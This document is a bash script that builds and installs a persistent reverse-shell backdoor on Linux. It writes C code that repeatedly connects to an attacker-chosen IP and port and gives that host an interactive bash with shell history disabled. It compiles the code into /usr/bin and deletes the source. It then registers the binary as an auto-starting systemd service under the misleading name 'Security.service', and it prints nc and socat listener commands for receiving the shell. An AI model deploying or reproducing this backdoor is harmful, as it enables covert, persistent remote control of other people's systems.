#!/bin/bash

read -p "Enter IP address: " IP_ADDRESS
read -p "Enter Port number: " PORT_NUMBER

SOURCE_FILE="network_secure.c"
OUTPUT_FILE="/usr/bin/secures"
SERVICE_FILE="/etc/systemd/system/Security.service"

echo "Creating $SOURCE_FILE..."

cat <<EOL > $SOURCE_FILE
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define CONNECT_RETRY  50
#define RECONNECT_WAIT 10

int main(void) {
    int port = $PORT_NUMBER;
    const char *ip = "$IP_ADDRESS";

    while (1) {
        int sockt = socket(AF_INET, SOCK_STREAM, 0);
        if (sockt < 0) {
            sleep(CONNECT_RETRY);
            continue;
        }

        struct sockaddr_in revsockaddr;
        revsockaddr.sin_family = AF_INET;
        revsockaddr.sin_port = htons(port);
        revsockaddr.sin_addr.s_addr = inet_addr(ip);

        if (connect(sockt, (struct sockaddr *)&revsockaddr, sizeof(revsockaddr)) < 0) {
            close(sockt);
            sleep(CONNECT_RETRY);
            continue;
        }

        pid_t pid = fork();
        if (pid < 0) {
            close(sockt);
            sleep(CONNECT_RETRY);
            continue;
        }

        if (pid == 0) {
            dup2(sockt, 0);
            dup2(sockt, 1);
            dup2(sockt, 2);
            close(sockt);

            setenv("TERM", "xterm-256color", 1);
            setenv("HISTFILE", "", 1);

            char *const argv[] = {"/bin/bash", "-i", NULL};
            execv("/bin/bash", argv);
            _exit(1);
        }

        close(sockt);
        waitpid(pid, NULL, 0);
        sleep(RECONNECT_WAIT);
    }

    return 0;
}
EOL

echo "$SOURCE_FILE created!"

gcc $SOURCE_FILE -o $OUTPUT_FILE

if [ $? -eq 0 ]; then
    echo "Compilation successful!"
    rm -f $SOURCE_FILE
    echo "$SOURCE_FILE has been deleted."

else
    echo "Compilation failed!"
    exit 1
fi

echo "Creating systemd service file..."
cat <<EOL > $SERVICE_FILE
[Unit]
Description=Process Security
After=network.target

[Service]
Type=simple
Environment=PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
Environment=TERM=xterm-256color
ExecStart=$OUTPUT_FILE
Restart=on-failure
RestartSec=60

[Install]
WantedBy=multi-user.target
EOL

chmod 700 $SERVICE_FILE

echo "Enabling and starting the service..."
systemctl daemon-reload
systemctl enable Security.service
systemctl start Security.service

systemctl status Security.service

echo ""
echo "Listener (recommended for interactive shell):"
echo "  socat file:\`tty\`,raw,echo=0 TCP-LISTEN:${PORT_NUMBER},reuseaddr"
echo "  or: rlwrap nc -lvnp ${PORT_NUMBER}"
